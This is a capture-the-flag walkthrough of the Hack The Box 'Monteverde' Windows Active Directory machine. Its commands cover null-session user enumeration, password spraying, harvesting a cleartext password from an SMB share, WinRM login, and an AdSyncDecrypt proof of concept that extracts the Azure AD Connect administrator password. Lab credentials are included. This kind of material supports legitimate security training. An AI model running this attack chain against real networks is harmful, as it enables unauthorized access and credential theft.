---
date: 2025-02-03
categories: [Windows, Medium, AD]
---

![Monteverde](https://labs.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [egre55](https://app.hackthebox.com/users/1190)        | [Hack The Box](https://www.hackthebox.com/)     | Medium           | Windows   |

---









- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

```python
nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.172 -oG scan
/opt/extractports scan
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49673,49674,49676,49696 -sCV -Pn 10.10.10.172 -oN ports
```

![image](https://github.com/user-attachments/assets/df7c4a62-b26d-45d6-b631-b06c8e460a7d)

-  I found the domain `MEGABANK.LOCAL`, I added it to the file in the `hosts` file
- When I see the port 53 open, I list the mails servers and find a subdomain that I add to the hosts file

```python
dig @10.10.10.172 MEGABANK.LOCAL mx
```

![image](https://github.com/user-attachments/assets/2950ad1e-3114-4fbc-bedc-31d7f46240d4)

- I connect to rpcclient using a null session to enumerate system users. With those users I check if any of them use the same user name as their password. I find the user SABatchJobs as valid.

```python
rpcclient -U "" -N 10.10.10.172
	enumdomusers
netexec smb 10.10.10.172 -u users -p users --continue-on-success
```

- Making use of the credentials found I list the user's shares and find inside the Users$ folder an azure.xml file with a clear text password.

```python
smbclient -U 'SABatchJobs'  \\\\10.10.10.172\\users$ 
```

![image](https://github.com/user-attachments/assets/bc25e259-c68c-40b1-b176-1f7cec0ffc5a)

- I check which user this credential belongs to and find that it belongs to the user mhope. With these credentials I connect to the system with winrm and I manage to read the first flag.
```python
netexec smb 10.10.10.172 -u users -p '4n0therD4y@n0th3r$' --continue-on-success
evil-winrm -i  10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

![image](https://github.com/user-attachments/assets/1c336bf2-7370-4629-9834-4e0121a23e64)

- When I list the files in the user's directory I find the .Azure folder

![image](https://github.com/user-attachments/assets/036dadcc-2c2e-476e-9592-26616b146f28)

- When I check which groups this user belongs to, I see that he is a member of the “Azure Admins” group. Searching for information about this I find a [post](https://blog.xpnsec.com/azuread-connect-for-redteam/) that indicates several ways to get the password stored in the database. Searching further I find a [PoC](https://github.com/VbScrub/AdSyncDecrypt). 
- This indicates that we have to move to the folder `C:\Program Files\Microsoft Azure AD Sync Bin` and from this we call the PoC executable.

```python
C:\Windows\temp\AdDecrypLexe -FullSQL
```

- Thanks to this we can read in clear text the password stored in the database and after validating if it belongs to a user, we can see that it is the Administrator's password.

![image](https://github.com/user-attachments/assets/c92472ad-cd0e-474d-b080-2ec74dd74a72)

 - We use the credentials to log in and read the second flag

```python
evil-winrm -i  10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'
```
